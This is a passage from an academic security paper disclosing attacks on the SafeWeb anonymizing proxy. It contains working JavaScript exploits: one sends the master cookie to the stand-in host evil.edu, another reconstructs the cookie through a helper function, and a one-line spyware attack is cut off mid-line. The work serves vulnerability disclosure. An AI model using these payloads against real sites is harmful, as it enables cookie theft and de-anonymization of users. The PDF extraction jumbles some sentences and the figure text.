program  that  merely  redirects  the  current  page  to 
www.bu.edu: 
window.location=”http://www.bu.edu”;
If  this  untrusted  code  were  given  to  the  user’s  Web 
browser, then it would directly contact the www.bu.edu 
Web server, sending the user’s IP address, and thereby 
violating  anonymity.    Given  this  input,  the  JavaScript 
rewriting engine produces something like this: 
window.location = window.top.fugunet_
loc_href_fixer("https://www.safewe
b.com/_u(http://[omitted]", "http:
//www.bu.edu", false);
function 
fugunet_loc_href_fixer 
The 
(not  shown) 
produces a URL that, when fetched, instructs SafeWeb 
to obtain and sanitize http://www.bu.edu, just as 
in the first paragraph of this section.  Again, when such 
a URL is  fetched, the server  at  www.bu.edu  will only 
see an access from www.safeweb.com, and the log files 
at www.bu.edu will only contain SafeWeb’s IP address, 
rather  than  the  user’s. 
  Of  course,  the  logs  at 
www.safeweb.com  will  contain  evidence  of  the  user’s 
indirect accesses to www.bu.edu, so these logs could be 
an  attractive  target  for  hackers,  governments,  and 
litigants  [9,19].    But  basically,  the  input  JavaScript 
program has been rendered functional and safe. 
The  window’s  current  URL  location  is  not  the  only 
JavaScript  element  that  must  be  sanitized.    SafeWeb 
rewrites references to the “parent” and “top” attributes 
of  Window  objects,  the  “src”  attribute  of  objects 
derived  from  HTMLElement,  document.cookie,  and 
many other sensitive elements.  All of this rewriting is 
meant  to  prevent  IP  addresses  from  spilling  to  the 
wrong  site,  but  it  is  also  required  so  that  JavaScript 
programs  behave  as  intended  by  their  original  authors 
User
E
n
S
c
r
S
y
L
p
t
e
d
User
Firewall
d
pte
cry
n
L E
S
S
Internet
SafeWeb
Server
WebMD
Hotmail
Monster
CNN
Figure 2: SafeWeb Architecture 
Playboy
even  when  running  in  SafeWeb’s  frameset  context 
described in Section 5.2. 
5.  The attacks  
The  example  JavaScript  program  shown  above  is  a 
simple case: one string literal URL  must be processed 
into  a  safe  version.    But  client-side  JavaScript  is  no 
trivial  language.    For  example,  it  gives  JavaScript 
programs full access to the JavaScript interpreter at run-
time 
(very 
commonly used to add or alter Web page content at run 
time), eval function,  and “Function” object: JavaScript 
programs  can  compute  and  execute  new  JavaScript 
code at run time.   
its  document.write  method 
through 
that 
run-time 
interpreter  access 
Recognizing 
is 
threatening,  SafeWeb  implemented  two  modes  of 
JavaScript  rewriting:  “recommended”  and  “paranoid” 
modes.    The  difference  between  the  two  is  in  the 
handling of “eval”-like actions. In recommended mode, 
SafeWeb uses some weak run-time heuristics to remove 
certain  problematic  constructions  but  lets  most  code 
through.      In  paranoid  mode,  SafeWeb  removes  even 
more.    In  other  words,  recommended  mode  prefers 
Figure 3: Configuration settings controlled by the master cookie in PrivaSec's service based on SafeWeb’s 
technology.  The settings shown can be considered minimum privacy.
the  name, 
faithfulness, and paranoid mode prefers anonymity.  As 
implied  by 
is 
“recommended” in both SafeWeb and PrivaSec.  This 
setting  is  controlled  by  an  all-purpose  options  dialog 
box; see Figure 3. 
the  default  mode 
are 
possible 
against 
anonymity 
Given  this  tradeoff  it  should  not  be  surprising  that 
attacks 
in 
recommended  mode.    For  example,  a  single  carefully 
crafted  JavaScript  statement  is  enough  to  cause  a 
SafeWeb  user’s  Web  browser  to  reveal  its  real  IP 
address to the attacker.  What is perhaps unexpected is 
how  much  more  damage  the  attacker’s  code  can  do, 
and  that  equivalent  attacks  are  possible  in  paranoid 
mode. 
5.1.  The master cookie 
As  mentioned  in  Section  4,  SafeWeb  multiplexes 
cookies 
into  a  master  cookie  associated  with 
safeweb.com.  For example, if a user visits wired.com 
through  SafeWeb  and  wired.com  transmits  a  Set-
Cookie header back to the user, SafeWeb then adds the 
pertinent  information  to  the  cookie  it  shares  with  the 
SafeWeb user. 
SafeWeb’s  master  cookie  also  stores 
its  own 
configuration  settings,  such  as  recommended  or 
paranoid mode, whether to save persistent subcookies, 
whether to attempt to block Java applets, etc.   These 
settings are shown in Figure 3. For example, selecting 
“block all cookies” sets a bit in the master cookie that 
directs  the  SafeWeb  sanitizer  to  block  actions  that 
manipulate  cookies  (except  for  those  referring  to  the 
safeweb.com cookie).  If cookies are fully disabled in 
the  user’s  browser,  then  settings  embedded  in  the 
master cookie cannot be communicated to the SafeWeb 
sanitizer;  as  a  result,  the  service  reverts  to  its  default 
settings.   
The  table  below  shows  some  of  the  SafeWeb  master 
cookie.  The first record shows SafeWeb configuration 
information (encoded as an integer), and the last record 
represents a cookie deposited from the .bu.edu domain 
associating the key “foo” with the value “bar”. 
SafeWeb_options = 384
/.wired.com/:p_uniqid = 7gNK40dLJ4O
+yV8YkD 
/.lycos.com/:lubid = 010000508BD322
4708043BD828B8003DA2EE00000000
/servedby.advertising.com/:57646125
= !ee910010040218560018!00000000-0
0008869-00007874-3bd82860-00000000-
*64.124.150.141*
/.bu.edu/:foo = bar
is 
Clearly,  a  user’s  master  cookie 
sensitive  
information. 
  Besides  containing  overall  security 
settings, each subcookie contained within it is evidence 
that the  user has visited the corresponding site, and it 
may  also  indicate  the  SafeWeb  user’s  pseudonymous 
identity there.   
the 
cookie  values 
Ordinarily,  two  unrelated  Web  sites  have  no  way  to 
discover 
each 
independently  deposited  on  a  user’s  browser  [24,32].  
But under this master cookie scheme, anyone who gets 
the single SafeWeb master cookie really gets all of the 
cookies  previously  sent  to  the  user’s  browser  through 
SafeWeb.   
they 
that 
5.1.1. Stealing and changing the master cookie 
self['document']['cookie']="AnonGo_op
tions=Win1_384; path=/";
self['document']['cookie']="SafeWeb_o
ptions=384; path=/; expires=Mon Oc
t 31 00:00:00 EST 2012";
foo=eval;
foo('(new Image(1,1)).src="https://ev
il.edu/"+(new Date()).getTime()+do
cument.cookie');
Recall  that  the  user’s  browser  executes  all  scripts 
fetched  via  SafeWeb  in  the  context  of  safeweb.com, 
which it believes is the  site  being visited.  Therefore, 
document.cookie  is  the  master  cookie  within  this 
script.    Since  the  SafeWeb  rewriter  does  not  want  a 
third  party  JavaScript  program  to  gain  access  to  the 
entire  master  cookie,  it  rewrites  overt  references  to 
document.cookie.  But it is not capable of recognizing 
synonyms such as self[‘document’] [‘cookie’]. 
Whatever the user’s current SafeWeb settings are, this 
attack  reverts  them  to  the  “minimum  privacy”  as 
shown  in  Figure  3;  the  number  384  denotes  that 
particular  combination  of  settings.    (Beware  of  the 
confusing asymmetry in JavaScript’s cookie semantics: 
the first two lines would appear to overwrite the master 
cookie, but in fact, they simply add value pairs to it.) 
and 
The  SafeWeb  sanitizing  engine  does  not  model 
program  data  flow  very  thoroughly,  as  the  “foo” 
synonym we establish for “eval” in the third statement 
is  not  treated  as  suspicious.    As  a  result,  the  fourth 
statement  is  not  rewritten  on  its  way  to  the  user’s 
browser 
literal 
“document.cookie”  makes  it  through.    This  statement 
causes  the  user’s  browser  to  transmit  the  full  master 
cookie  to  the  adversary  at  evil.edu,  bypassing  the 
SafeWeb sanitizer – and therefore revealing the user’s 
IP address – in the process.  The reference to the Date 
object  merely  ensures  that  the  HTTP  transaction 
evades intervening caches.    
even 
time 
this 
the 
5.1.2. Using a SafeWeb helper function to read the 
master cookie 
t = self;
t = t.top;
gcd = t.frames[0].getCookieData;
t = t.frames[1];
//these two lines
//change self
// restore self
c = "/";
n = "?";
while (n != "") {
n = gcd(c);
c += n + ";";
}
opts = "SafeWeb_options";
c += opts + gcd(opts);
alert("Master cookie is " + c);
This  attack  is  interesting  because  it  grabs  the  master 
cookie  without  explicitly  mentioning  it,  by  using  a 
helper  function  called  getCookieData  provided  in  the 
top  frame  of  the  SafeWeb  infrastructure  (see  Section 
5.2).    A  call  such  as  getCookieData(‘www.example. 
com’)  is  meant  to  be  used  internally  by  SafeWeb  to 
extract only the www.example.com part of the master 
cookie.  However, it allows its searches to span record 
boundaries, and it has no way of knowing whether it is 
being called by SafeWeb or by an attacker.  We exploit 
these facts to reconstruct the entire master cookie using 
a simple prefix search.  The SafeWeb rewriting engine 
does not alter any of the code in this attack. 
5.2.  The SafeWeb frames 
The control part of the SafeWeb interface is separated 
from  the  content  part  using  HTML  frames.    Refer  to 
Figure 4; in the top frame, we can see that the user has 
requested a page from www.bu.edu, and the content of 
that page is shown in the lower frame.   
The relevant URLs are: 
(cid:31)  Overall 
frameset: 
https://64.152.73
.207/_i:_v(1020965473820):_o(384):
http://www.privasec.com/memberhome
2.htm 
(cid:31)  Top frame: https://64.152.73.207/spoo
l/common_files/upperframe.php?flas
h=322_1
(cid:31)  Bottom frame: https://64.152.73.207/_
u(http://www.bu.edu):_o(322):_win(
1):http://www.bu.edu
 (The  examples  in  this  section  refer  to  PrivaSec’s 
deployed service; therefore, the URLs  use PrivaSec’s 
IP address 64.152.73.207 rather than safeweb.com.) 
Figure 4: PrivaSec screen shot showing SafeWeb 
technology. The top frame is a control panel 
(“SurfSecure”), and the bottom frame is the page 
requested by the user. 
One  attack  approach  is  to  alter  the  top  frame  to 
somehow make it track the content viewed by the user 
in the lower frame.  But keep in mind that the attacker 
only  has  direct  control  over  content  in  the  bottom 
frame,  and  JavaScript’s  “same  origin”  policy  in  Web 
browsers  forbids  two  frames  from  communicating 
unless  they  are  from  the  same  domain  in  order  to 
prevent one site from stealing data from another  [15].  
At first glance, it would seem difficult for the bottom 
frame to reach onto the top (or vice versa). 
But in this case, both  frames do come from the same 
domain.    Refer  to  the  URLs  above;  both  come  from 
64.152.73.207, one of PrivaSec’s addresses.  This is no 
accident;  by  inspecting  the  sanitized  code,  it  is  clear 
that the SafeWeb was built with this cross-frame access 
by JavaScript in mind.  So in addition to overruling the 
standard  cookie  domain  restrictions  noted  above, 
SafeWeb  also  sacrificed  the  browser’s  native  cross-
domain frame protection.   
5.2.1. One-line spyware attack 
self['window']['top'].frames[0]['cook
ie_munch'] = Function('i=new Image
(1,1);i.s'+'rc="https://evil.edu/"